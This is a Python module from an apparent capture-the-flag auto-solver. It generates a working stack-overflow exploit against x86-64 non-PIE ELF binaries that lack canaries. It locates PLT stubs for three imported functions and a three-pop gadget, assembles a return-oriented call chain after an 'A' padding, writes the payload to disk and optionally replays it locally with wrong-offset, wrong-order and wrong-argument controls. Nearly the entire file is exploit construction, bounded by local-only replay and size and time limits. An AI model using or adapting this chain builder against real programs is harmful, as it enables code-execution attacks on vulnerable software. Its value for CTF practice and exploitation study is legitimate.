"""Opt-in bounded three-call x86-64 PLT candidate with local controls."""

import hashlib
import json
import os
from pathlib import Path
import re
import stat
import time
import uuid

from . import core
from . import pwn_ret2win as pwn
from .profiles.elf import inspect_elf
from .profiles.service_transport import run_service


def _spec(path, deadline):
    path = Path(path).absolute()
    if path.is_symlink():
        raise ValueError("calls JSON must not be a symlink")
    try:
        descriptor = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
    except OSError as error:
        raise ValueError("calls JSON must be an available private regular file") from error
    with os.fdopen(descriptor, "rb") as source:
        info = os.fstat(source.fileno())
        if (not stat.S_ISREG(info.st_mode) or info.st_uid != os.getuid() or
                info.st_mode & 0o077 or not 0 < info.st_size <= 4096):
            raise ValueError("calls JSON must be a private regular file of at most 4096 bytes")
        raw = source.read(4097)
    if len(raw) > 4096 or time.monotonic() > deadline:
        raise ValueError("calls JSON exceeds size or time budget")

    def unique(pairs):
        result = {}
        for key, value in pairs:
            if key in result:
                raise ValueError("calls JSON has duplicate keys")
            result[key] = value
        return result

    try:
        document = json.loads(raw, object_pairs_hook=unique)
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ValueError("calls JSON is malformed") from error
    if (type(document) is not dict or set(document) != {"schema_version", "calls"} or
            type(document["schema_version"]) is not int or document["schema_version"] != 1 or
            type(document["calls"]) is not list or len(document["calls"]) != 3):
        raise ValueError("calls JSON needs schema version 1 and exactly three calls")
    calls = []
    for row in document["calls"]:
        if (type(row) is not dict or set(row) != {"symbol", "args"} or
                type(row["symbol"]) is not str or
                not re.fullmatch(r"[A-Za-z_][A-Za-z_0-9]{0,127}", row["symbol"]) or
                type(row["args"]) is not list or len(row["args"]) != 3 or
                any(type(value) is not str or not re.fullmatch(r"0x[0-9a-fA-F]{1,16}", value)
                    for value in row["args"])):
            raise ValueError("each call needs one bounded imported symbol and three hex u64 args")
        calls.append({"symbol": row["symbol"],
                      "args": [int(value, 16) for value in row["args"]]})
    if len({row["symbol"] for row in calls}) != 3:
        raise ValueError("call symbols must be unique")
    return path, hashlib.sha256(raw).hexdigest(), calls


def _spec_current(path, digest, deadline):
    try:
        _, current, _ = _spec(path, deadline)
        return current == digest
    except (OSError, ValueError):
        return False


def _candidate(binary, offset, calls, deadline):
    from elftools.elf.elffile import ELFFile
    from elftools.elf.relocation import RelocationSection
    from elftools.elf.sections import SymbolTableSection

    report, warnings = inspect_elf(binary, max_symbols=256, max_gadgets=256)
    if report is None:
        raise ValueError("ELF inspection failed: " + "; ".join(warnings))
    if (report["architecture"] != "x86-64" or report["bits"] != 64 or
            report["elf_type"] != "ET_EXEC" or report["mitigations"]["pie"]):
        raise ValueError("call chain supports only x86-64 non-PIE ELF")
    if report["mitigations"]["canary"] != "not detected":
        raise ValueError("detected or uncertain canary blocks this call chain")
    if type(offset) is not int or not 0 < offset <= 4096:
        raise ValueError("verified overflow offset is invalid")
    with binary.open("rb") as source:
        elf = ELFFile(source)
        plt = elf.get_section_by_name(".plt")
        rel = elf.get_section_by_name(".rela.plt")
        if (plt is None or elf.get_section_by_name(".plt.sec") is not None or
                not isinstance(rel, RelocationSection) or
                rel["sh_type"] != "SHT_RELA" or rel.num_relocations() > 256 or
                rel.num_relocations() < 3 or plt["sh_entsize"] != 16 or
                plt["sh_size"] != (rel.num_relocations() + 1) * 16):
            raise ValueError("unsupported or ambiguous ordinary PLT layout")
        dynsym = elf.get_section(rel["sh_link"])
        if not isinstance(dynsym, SymbolTableSection) or dynsym.name != ".dynsym":
            raise ValueError("PLT relocation does not link to dynamic symbols")
        segments = [segment for segment in elf.iter_segments()
                    if segment["p_type"] == "PT_LOAD" and segment["p_flags"] & 1]
        writable = [segment for segment in elf.iter_segments()
                    if segment["p_type"] == "PT_LOAD" and segment["p_flags"] & 2]
        if not any(segment["p_vaddr"] <= plt["sh_addr"] and
                   plt["sh_addr"] + plt["sh_size"] <= segment["p_vaddr"] + segment["p_filesz"]
                   for segment in segments):
            raise ValueError("PLT lies outside an executable segment")
        code = plt.data()
        if code[:2] != b"\xff\x35" or code[6:8] != b"\xff\x25":
            raise ValueError("unsupported PLT resolver stub")
        entries = {}
        for index, relocation in enumerate(rel.iter_relocations()):
            symbol = dynsym.get_symbol(relocation["r_info_sym"])
            name = symbol.name
            if name not in {row["symbol"] for row in calls}:
                continue
            if (relocation["r_info_type"] != 7 or relocation["r_addend"] != 0 or
                    symbol["st_info"]["type"] != "STT_FUNC" or
                    symbol["st_shndx"] != "SHN_UNDEF" or name in entries or
                    not any(segment["p_vaddr"] <= relocation["r_offset"] and
                            relocation["r_offset"] + 8 <=
                            segment["p_vaddr"] + segment["p_memsz"]
                            for segment in writable)):
                raise ValueError("call symbol has ambiguous or unsupported PLT relocation")
            stub = code[(index + 1) * 16:(index + 2) * 16]
            address = plt["sh_addr"] + (index + 1) * 16
            displacement = int.from_bytes(stub[2:6], "little", signed=True)
            resolver = int.from_bytes(stub[12:16], "little", signed=True)
            if (len(stub) != 16 or stub[:2] != b"\xff\x25" or
                    stub[6] != 0x68 or int.from_bytes(stub[7:11], "little") != index or
                    stub[11] != 0xe9 or address + 6 + displacement != relocation["r_offset"] or
                    address + 16 + resolver != plt["sh_addr"]):
                raise ValueError("PLT stub bytes do not match call relocation")
            entries[name] = {"symbol": name, "plt_address": address,
                             "got_address": relocation["r_offset"],
                             "relocation_index": index}
        if len(entries) != 3:
            raise ValueError("exact imported call symbols were not found in PLT relocations")
        gadgets = []
        remaining = 1024 * 1024
        for segment in segments:
            length = min(segment["p_filesz"], remaining)
            source.seek(segment["p_offset"])
            data = source.read(length)
            remaining -= length
            for index in range(len(data) - 3):
                if data[index:index + 4] == b"\x5f\x5e\x5a\xc3":
                    gadgets.append({"address": segment["p_vaddr"] + index,
                                    "file_offset": segment["p_offset"] + index})
            if remaining <= 0:
                break
        if len(gadgets) != 1:
            raise ValueError("exact three-pop return gadget is absent or ambiguous")
    gadget = gadgets[0]["address"]
    alignment_ret = gadget + 3
    def word(value):
        return value.to_bytes(8, "little")
    links = [word(alignment_ret) + word(gadget) +
             b"".join(word(value) for value in row["args"]) +
             word(entries[row["symbol"]]["plt_address"]) for row in calls]
    payload = b"A" * offset + b"".join(links)
    if len(payload) > 512:
        raise ValueError("call chain exceeds conservative 512-byte input cap")
    if core._hash(binary, deadline) is None:
        raise ValueError("binary identity incomplete after ELF inspection")
    return payload, report, entries, gadgets[0], links, warnings


def _render(run, manifest, current):
    lines = ["# Autosolve local imported call chain", "",
             "PWN04: " + manifest["validation"] + ". Challenge acceptance: unverified.",
             "Source and replay inputs verified current: " + ("yes" if current else "no") + ".",
             "Verified stdin overflow offset: " + str(manifest["offset"]) + " bytes.",
             "Ordered imported calls: " + ", ".join(row["symbol"] for row in manifest["calls"]) + ".",
             "Local candidate replay: " + ("attempted once" if manifest["replay_attempted"]
                                          else "not attempted") + ".",
             "Controls: " + ", ".join(row["name"] + " " + row["status"]
                                    for row in manifest["controls"]) + "."]
    if manifest.get("replay_error"):
        lines.append("Replay stopped: " + manifest["replay_error"] + ".")
    if manifest["warnings"]:
        lines.append("Warnings: " + "; ".join(manifest["warnings"]))
    lines += ["", "Marker and controls are local output evidence only.",
              "Payload and raw transcripts remain in private run files.",
              "Resume checks identity and redraws this report without process replay.", ""]
    core._write_text(run / "report.md", "\n".join(lines))


def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
          runs_root=None, replay_local=False, resource_files=None):
    if (not isinstance(budget, (int, float)) or isinstance(budget, bool) or
            not 0 < budget <= 120):
        raise ValueError("call-chain budget must be positive and at most 120 seconds")
    prompt = pwn._bytes(prompt_hex, "prompt delimiter")
    marker = pwn._bytes(success_hex, "success marker")
    if marker in prompt or prompt in marker:
        raise ValueError("success marker and prompt delimiter overlap ambiguously")
    deadline = time.monotonic() + budget
    binary, digest = pwn._source(binary_path, deadline)
    if resource_files and not replay_local:
        raise ValueError("resource files require explicit local replay")
    offset, library_path = pwn._offset_evidence(offset_run, binary, digest, deadline)
    spec_path, spec_hash, calls = _spec(calls_json, deadline)
    resources = pwn._resources(resource_files, binary, deadline)
    if replay_local and not os.access(binary, os.X_OK):
        raise ValueError("local replay needs an executable binary")
    try:
        from elftools.common.exceptions import ELFError
    except ImportError as error:
        raise ValueError("pyelftools is required for imported call-chain inspection") from error
    try:
        payload, report, entries, gadget, links, warnings = _candidate(
            binary, offset, calls, deadline)
    except (ELFError, IndexError, KeyError, TypeError, OverflowError) as error:
        raise ValueError("unsupported or malformed ELF call-chain evidence") from error
    if marker in payload:
        raise ValueError("success marker appears in payload and an echo would be ambiguous")
    library, env_path, env_hash, libraries = (pwn._loader(library_path, deadline)
                                             if library_path is not None else
                                             (None, None, None, []))

    def identities():
        source = pwn._source_current(binary, digest, deadline)
        spec = _spec_current(spec_path, spec_hash, deadline)
        try:
            offset_ok = pwn._offset_evidence(offset_run, binary, digest, deadline) == (offset, library_path)
        except ValueError:
            offset_ok = False
        loader = pwn._loader_current(library, env_path, env_hash, libraries, deadline)
        return (source is True and spec and offset_ok and loader is True and
                pwn._resources_current(resources, deadline))

    if not identities():
        raise ValueError("source, call specification, offset or library identity changed during construction")
    root = Path(runs_root) if runs_root else core.ROOT / ".autosolve" / "runs"
    run = root / f"{time.strftime('%Y%m%d-%H%M%S')}-{uuid.uuid4().hex[:8]}"
    run.mkdir(parents=True, mode=0o700)
    fd = os.open(run / "payload.bin", os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o600)
    with os.fdopen(fd, "wb") as output:
        output.write(payload)
        output.flush()
        os.fsync(output.fileno())
    argv = ([str(env_path), f"LD_LIBRARY_PATH={library}", str(binary)]
            if library is not None else [str(binary)])
    blocks = b"".join((links[1], links[0], links[2]))
    wrong_arg = bytearray(payload)
    wrong_arg[offset + 16] ^= 1
    cases = (("short", b"B\n"), ("wrong-offset", payload[1:]),
             ("wrong-order", b"A" * offset + blocks),
             ("wrong-argument", bytes(wrong_arg)))
    controls = []

    def execute(data, timeout, cwd):
        return run_service(
            {"transport": {"argv": argv, "cwd": str(cwd)},
             "steps": [{"read": {"delimiter_hex": prompt.hex()}},
                       {"write_hex": data.hex()},
                       {"read": {"delimiter_hex": marker.hex()}}]},
            timeout=timeout, max_bytes=65536, max_frame_bytes=16384,
            max_steps=3, allow_local=True, local_env=pwn._replay_env(cwd))

    operation = None
    if replay_local:
        for name, data in cases:
            if not identities():
                controls.append({"name": name, "status": "inconclusive", "error": "identity"})
                continue
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                controls.append({"name": name, "status": "inconclusive", "error": "budget"})
                continue
            try:
                cwd = pwn._staged_cwd(run, name, resources, deadline)
            except ValueError:
                controls.append({"name": name, "status": "inconclusive", "error": "staging"})
                warnings.append("private resource staging incomplete before " + name + " control")
                continue
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                controls.append({"name": name, "status": "inconclusive", "error": "budget"})
                continue
            control, extra = execute(data, min(2, remaining / 5), cwd)
            transcript = control["transcript"]
            sent = next((i for i, row in enumerate(transcript) if row["direction"] == "send"),
                        len(transcript))
            pre = b"".join(bytes.fromhex(row["hex"]) for row in transcript[:sent]
                           if row["direction"] == "recv")
            post = b"".join(bytes.fromhex(row["hex"]) for row in transcript[sent:]
                            if row["direction"] == "recv")
            status = ("marker observed" if marker in pre or marker in post else
                      "marker absent" if control["error"] == "early_eof" and
                      control["bytes_sent"] == len(data) else "inconclusive")
            if status != "marker absent":
                warnings.extend(extra)
            if not identities() or not pwn._copied_resources_current(cwd, resources, deadline):
                status = "inconclusive"
                warnings.append("identity changed after " + name + " control")
            controls.append({"name": name, "status": status, "attempted": True,
                             "error": control["error"]})
            core._write_json(run / f"control-{name}-frames.json", control["frames"])
            core._write_text(run / f"control-{name}-transcript.jsonl", "".join(
                json.dumps(row, sort_keys=True) + "\n" for row in transcript))
        if identities() and deadline - time.monotonic() > 0:
            try:
                cwd = pwn._staged_cwd(run, "candidate", resources, deadline)
            except ValueError:
                warnings.append("private resource staging incomplete before candidate replay")
            else:
                remaining = deadline - time.monotonic()
                if remaining > 0:
                    operation, extra = execute(payload, remaining, cwd)
                    warnings.extend(extra)
                else:
                    warnings.append("budget ended during candidate resource staging")
        else:
            warnings.append("identity or budget prevented candidate replay")
    validation = "candidate" if not replay_local else "unverified"
    replay_error = operation["error"] if operation else None
    if operation is not None:
        transcript = operation["transcript"]
        sent = next((i for i, row in enumerate(transcript) if row["direction"] == "send"),
                    len(transcript))
        pre = b"".join(bytes.fromhex(row["hex"]) for row in transcript[:sent]
                       if row["direction"] == "recv")
        post = b"".join(bytes.fromhex(row["hex"]) for row in transcript[sent:]
                        if row["direction"] == "recv")
        if b"error while loading shared libraries" in pre or b"ld.so:" in pre:
            replay_error = "loader_failure"
        if marker in pre:
            warnings.append("success marker appeared before candidate write")
        if (operation["status"] == "complete" and operation["bytes_sent"] == len(payload)
                and marker in post and marker not in pre and identities() and
                pwn._copied_resources_current(cwd, resources, deadline) and
                all(row["status"] == "marker absent" for row in controls) and
                len(controls) == 4 and replay_error != "loader_failure"):
            validation = "local marker observed with controls"
        core._write_json(run / "frames.json", operation["frames"])
        core._write_text(run / "transcript.jsonl", "".join(
            json.dumps(row, sort_keys=True) + "\n" for row in transcript))
    manifest = {"schema_version": core.SCHEMA, "category": "pwn_services",
                "run_type": "pwn_call_chain", "status": "partial", "validation": validation,
                "challenge_accepted": False, "source": str(binary), "source_sha256": digest,
                "offset_run": str(Path(offset_run).absolute()), "offset": offset,
                "calls_json": str(spec_path), "calls_sha256": spec_hash, "calls": calls,
                "payload_sha256": hashlib.sha256(payload).hexdigest(),
                "gadget": gadget, "plt_entries": entries,
                "alignment_ret_address": gadget["address"] + 3,
                "resources": resources,
                "architecture": report["architecture"], "mitigations": report["mitigations"],
                "library_path": str(library) if library is not None else None,
                "env_tool_path": str(env_path) if env_path is not None else None,
                "env_tool_sha256": env_hash, "libraries": libraries,
                "replay_attempted": operation is not None, "replay_error": replay_error,
                "controls": controls, "warnings": warnings,
                "coverage": {"PWN04": {"status": "ran" if validation ==
                                      "local marker observed with controls" else "partial",
                                      "note": "verified imported x64 PLT calls, local only"}}}
    core._write_json(run / "manifest.json", manifest)
    _render(run, manifest, identities() and pwn._run_copies_current(
        run, resources, controls, operation is not None, deadline))
    return run, "partial"


def resume(run_path):
    run = Path(run_path).absolute()
    if run.is_symlink():
        raise ValueError("call-chain run directory must not be a symlink")
    manifest = json.loads((run / "manifest.json").read_text())
    if (manifest.get("schema_version") != core.SCHEMA or
            manifest.get("run_type") != "pwn_call_chain" or
            manifest.get("category") != "pwn_services"):
        raise ValueError("not a compatible call-chain run")
    deadline = time.monotonic() + 10
    current = (pwn._source_current(Path(manifest["source"]), manifest["source_sha256"],
                                  deadline) is True and
               _spec_current(Path(manifest["calls_json"]), manifest["calls_sha256"], deadline))
    if current:
        try:
            current = pwn._offset_evidence(manifest["offset_run"],
                                           Path(manifest["source"]),
                                           manifest["source_sha256"], deadline) == (
                                               manifest["offset"], manifest["library_path"])
        except ValueError:
            current = False
    if current and manifest["library_path"] is not None:
        current = pwn._loader_current(Path(manifest["library_path"]),
                                      Path(manifest["env_tool_path"]),
                                      manifest["env_tool_sha256"],
                                      manifest["libraries"], deadline) is True
    if current:
        current = (pwn._resources_current(manifest["resources"], deadline) and
                   pwn._run_copies_current(run, manifest["resources"],
                                           manifest["controls"],
                                           manifest["replay_attempted"], deadline))
    _render(run, manifest, current)
    return run, "partial"


def report(run_path):
    return resume(run_path)[0] / "report.md"
